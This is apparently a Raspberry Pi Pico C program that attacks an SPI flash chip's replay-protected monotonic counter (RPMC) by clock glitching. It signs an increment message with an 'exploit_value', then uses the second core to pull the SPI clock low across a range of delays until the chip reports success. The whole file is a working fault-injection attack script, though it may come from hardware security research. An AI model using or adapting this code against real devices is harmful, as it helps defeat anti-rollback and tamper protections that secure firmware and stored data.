#include <stdio.h>
#include <stdint.h>
#include "pico/stdlib.h"
#include "pico/binary_info.h"
#include "pico/cyw43_arch.h"
#include "pico/multicore.h"
#include "rpmc_ops.h"
#include "mbedtls/md.h"
#include "hardware/spi.h"

#define TARGET_BAUDRATE (50U * 1000 * 1000) // 12 mhz


int loop(spi_inst_t * const spi_connection, const unsigned int led_pin, const unsigned int cs_pin)
{
    const uint8_t root_key[RPMC_HMAC_KEY_LENGTH] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    const uint8_t key_data[RPMC_KEY_DATA_LENGTH] = {0x00, 0x00, 0x00, 0x00}; 
    const uint8_t target_counter = 1;

    uint8_t hmac_key_register[RPMC_HMAC_KEY_LENGTH];
    if (mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256), root_key, RPMC_HMAC_KEY_LENGTH, key_data, RPMC_KEY_DATA_LENGTH, hmac_key_register)) {
        printf("Error: could not generate the hmac key\n");
        return 1;
    }
    
    if (update_hmac_key_register(spi_connection, cs_pin, target_counter, hmac_key_register, key_data)) {
        printf("Error: could not set initialize hmac key register\n");
        return 1;
    }
    printf("Updated hmac key register for counter %u\n", target_counter);

    // sign the message
    const uint32_t exploit_value = 420;
    const unsigned int signature_offset = RPMC_OP1_MSG_HEADER_LENGTH + RPMC_COUNTER_LENGTH;
    unsigned char increment_msg[RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH] = {
        OP1_OPCODE, // Opcode
		0x02, // CmdType
		target_counter, // CounterAddr
		0, // Reserved
        (exploit_value >> 24) & 0xff,
        (exploit_value >> 16) & 0xff,
        (exploit_value >> 8) & 0xff,
        exploit_value & 0xff
    };
    if (mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
                        hmac_key_register,
                        RPMC_HMAC_KEY_LENGTH,
                        increment_msg,
                        signature_offset,
                        increment_msg + signature_offset)) {
        printf("Error: can't sign hmac increment counter message\n");
        return 1;
    };

    for (uint32_t glitch_cycles = 10; glitch_cycles < 100; glitch_cycles++) {
        printf("Trying to glitch with %u cycles\n", glitch_cycles);
        
        multicore_fifo_push_blocking(glitch_cycles);
        spi_transaction(spi_connection, cs_pin, increment_msg, RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);

        poll_until_finished(spi_connection, cs_pin);
        uint8_t status = get_rpmc_status(spi_connection, cs_pin);

        if (status == 0x80) {
            cyw43_arch_gpio_put(led_pin, true);
            printf("Clock glitch successful with %u cycles\n", glitch_cycles);
        }
    }

    return 0;
}

/*
 * The second core is used to perform the clock glitch by pulling the clock down
 */
void core1_loop(void)
{
    while (true) {
        unsigned int counter_clocks = multicore_fifo_pop_blocking();

        // TODO: synchonize start of countdown 

        while (counter_clocks-- > 0)
            ;
        
        gpio_pull_down(PICO_DEFAULT_SPI_SCK_PIN);
        gpio_pull_up(PICO_DEFAULT_SPI_SCK_PIN);
    }
}

int main()
{
    stdio_init_all();
    sleep_ms(1000);
    printf("Device is starting\n");

    if (cyw43_arch_init()) {
        printf("Wi-Fi init failed\n");
        return 1;
    }

    spi_init(spi0, TARGET_BAUDRATE);
    gpio_set_function(PICO_DEFAULT_SPI_RX_PIN, GPIO_FUNC_SPI);
    gpio_set_function(PICO_DEFAULT_SPI_SCK_PIN, GPIO_FUNC_SPI);
    gpio_set_function(PICO_DEFAULT_SPI_TX_PIN, GPIO_FUNC_SPI);
    // Make the SPI pins available to picotool
    bi_decl(bi_3pins_with_func(PICO_DEFAULT_SPI_RX_PIN, PICO_DEFAULT_SPI_TX_PIN, PICO_DEFAULT_SPI_SCK_PIN, GPIO_FUNC_SPI));

    // Chip select is active-low, so we'll initialise it to a driven-high state
    gpio_init(PICO_DEFAULT_SPI_CSN_PIN);
    gpio_put(PICO_DEFAULT_SPI_CSN_PIN, 1);
    gpio_set_dir(PICO_DEFAULT_SPI_CSN_PIN, GPIO_OUT);
    // Make the CS pin available to picotool
    bi_decl(bi_1pin_with_name(PICO_DEFAULT_SPI_CSN_PIN, "SPI CS"));

    // initialze core 1
    multicore_reset_core1();
    multicore_launch_core1(core1_loop);

    int ret = loop(spi0, CYW43_WL_GPIO_LED_PIN, PICO_DEFAULT_SPI_CSN_PIN);
exit:
    spi_deinit(spi0);
    return ret;
}
